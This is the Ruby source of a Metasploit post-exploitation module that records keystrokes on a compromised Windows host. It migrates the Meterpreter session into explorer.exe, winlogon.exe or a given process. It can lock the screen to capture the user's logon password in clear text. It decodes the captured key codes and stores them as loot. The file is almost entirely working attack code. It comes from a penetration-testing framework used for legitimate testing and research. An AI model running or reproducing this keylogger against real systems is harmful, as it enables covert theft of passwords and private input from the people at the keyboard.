##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'           => 'Windows Capture Keystroke Recorder',
        'Description'    => %q{
          This module can be used to capture keystrokes. To capture keystrokes when the session is running
          as SYSTEM, the MIGRATE option must be enabled and the CAPTURE_TYPE option should be set to one of
          Explorer, Winlogon, or a specific PID. To capture the keystrokes of the interactive user, the
          Explorer option should be used with MIGRATE enabled. Keep in mind that this will demote this session
          to the user's privileges, so it makes sense to create a separate session for this task. The Winlogon
          option will capture the username and password entered into the logon and unlock dialog. The LOCKSCREEN
          option can be combined with the Winlogon CAPTURE_TYPE to for the user to enter their clear-text
          password.
            },
        'License'        => MSF_LICENSE,
        'Author'         => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
        'Platform'       => [ 'win' ],
        'SessionTypes'   => [ 'meterpreter', ]

      ))
    register_options(
      [
        OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
        OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes', 5]),
        OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
        OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                'explorer', ['explorer','winlogon','pid']])

      ], self.class)
    register_advanced_options(
      [
        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false])
      ], self.class)
  end

  # Run Method for when run command is issued
  def run

    print_status("Executing module against #{sysinfo['Computer']}")
    if datastore['MIGRATE']
      if datastore['CAPTURE_TYPE'] == "pid"
        if  !migrate_pid(datastore['PID'], session.sys.process.getpid)
          print_error("Unable to migrate to given PID. Using Explorer instead.")
          process_migrate
        end
      else
        return unless process_migrate
      end
    end

    if startkeylogger
      keycap(datastore['INTERVAL'],set_log)
    end
  end

  # Returns the path name to the stored loot filename
  def set_log
    store_loot("host.windows.keystrokes", "text/plain", session, "Keystroke log started at #{Time.now.to_s}\n", "keystrokes.txt", "User Keystrokes")
  end

  def lock_screen
    print_status("Locking the desktop...")
    lock_info = session.railgun.user32.LockWorkStation()
    if lock_info["GetLastError"] == 0
      print_status("Screen has been locked")
    else
      print_error("Screen lock failed")
    end
  end

  # This function evaluates the capture type and migrates accordingly.
  # In the event of errors, it will default to the explorer capture type.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def process_migrate
    captype = datastore['CAPTURE_TYPE']

    if captype == "winlogon"
      if is_uac_enabled? and not is_admin?
        print_error("UAC is enabled on this host! Winlogon migration will be blocked. Using Explorer instead.")
      else
        success = migrate(get_pid("winlogon.exe"), "winlogon.exe", session.sys.process.getpid)
        if datastore['LOCKSCREEN'] && success
          lock_screen
          return success
        end
        return success
      end
    end

    return migrate(get_pid("explorer.exe"), "explorer.exe", session.sys.process.getpid)
  end

  # This function returns the first process id of a process with the name provided.
  # It will make sure that the process has a visible user meaning that the session has rights to that process.
  # Note: "target_pid = session.sys.process[proc_name]" will not work when "include Msf::Post::Windows::Priv" is in the module.
  #
  # @return [Fixnum] the PID if one is found
  # @return [NilClass] if no PID was found
  def get_pid(proc_name)
    processes = client.sys.process.get_processes
    processes.each do |proc|
      if proc['name'] == proc_name && proc['user'] != ""
        return proc['pid']
      end
    end
    return nil
  end

  # This function attempts to migrate to the specified process by Name.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def migrate(target_pid, proc_name, current_pid)
    if !target_pid
      print_error("Could not migrate to #{proc_name}.")
      return false
    end

    print_status("Trying #{proc_name} (#{target_pid})")

    if target_pid == current_pid
      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    end

    begin
      client.core.migrate(target_pid)
      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Could not migrate to #{proc_name}.")
      print_error(error.to_s)
      return false
    end
  end

  # This function attempts to migrate to the specified process by PID only.
  #
  # @return [TrueClass] if it successfully migrated
  # @return [FalseClass] if it failed to migrate
  def migrate_pid(target_pid, current_pid)
    if !target_pid
      print_error("Could not migrate to PID #{target_pid}.")
      return false
    end

    if !has_pid?(target_pid)
      print_error("Could not migrate to PID #{target_pid}. Does not exist!")
      return false
    end

    print_status("Trying PID: #{target_pid}")

    if target_pid == current_pid
      print_good("Already in #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    end

    begin
      client.core.migrate(target_pid)
      print_good("Successfully migrated to #{client.sys.process.open.name} (#{client.sys.process.open.pid}) as: #{client.sys.config.getuid}")
      return true
    rescue ::Rex::Post::Meterpreter::RequestError => error
      print_error("Could not migrate to PID #{target_pid}.")
      print_error(error.to_s)
      return false
    end
  end


  # Method for starting the keylogger
  def startkeylogger()
    begin
      #print_status("Grabbing Desktop Keyboard Input...")
      #session.ui.grab_desktop
      print_status("Starting the keystroke sniffer...")
      session.ui.keyscan_start
      return true
    rescue
      print_error("Failed to start the keystroke sniffer: #{$!}")
      return false
    end
  end

  # Method for writing found keystrokes
  def write_keylog_data(logfile)
    data = session.ui.keyscan_dump
    outp = ""
    data.unpack("n*").each do |inp|
      fl = (inp & 0xff00) >> 8
      vk = (inp & 0xff)
      kc = VirtualKeyCodes[vk]

      f_shift = fl & (1<<1)
      f_ctrl  = fl & (1<<2)
      f_alt   = fl & (1<<3)

      if(kc)
        name = ((f_shift != 0 and kc.length > 1) ? kc[1] : kc[0])
        case name
        when /^.$/
          outp << name
        when /shift|click/i
        when 'Space'
          outp << " "
        else
          outp << " <#{name}> "
        end
      else
        outp << " <0x%.2x> " % vk
      end
    end

    sleep(2)
    if not outp.empty?
      print_good("Keystrokes captured #{outp}") if datastore['ShowKeystrokes']
      file_local_write(logfile,"#{outp}\n")
    end
  end

  # Method for Collecting Capture
  def keycap(keytime, logfile)
    begin
      rec = 1
      #Creating DB for captured keystrokes
      print_status("Keystrokes being saved in to #{logfile}")
      #Inserting keystrokes every number of seconds specified
      print_status("Recording keystrokes...")
      while rec == 1
        write_keylog_data(logfile)
        sleep(keytime.to_i)
      end
    rescue::Exception => e
      print_status "Saving last few keystrokes..."
      write_keylog_data(logfile)
      print_status("#{e.class} #{e}")
      print_status("Stopping keystroke sniffer...")
      session.ui.keyscan_stop
    end
  end

  def cleanup
    session.ui.keyscan_stop rescue nil
  end

end
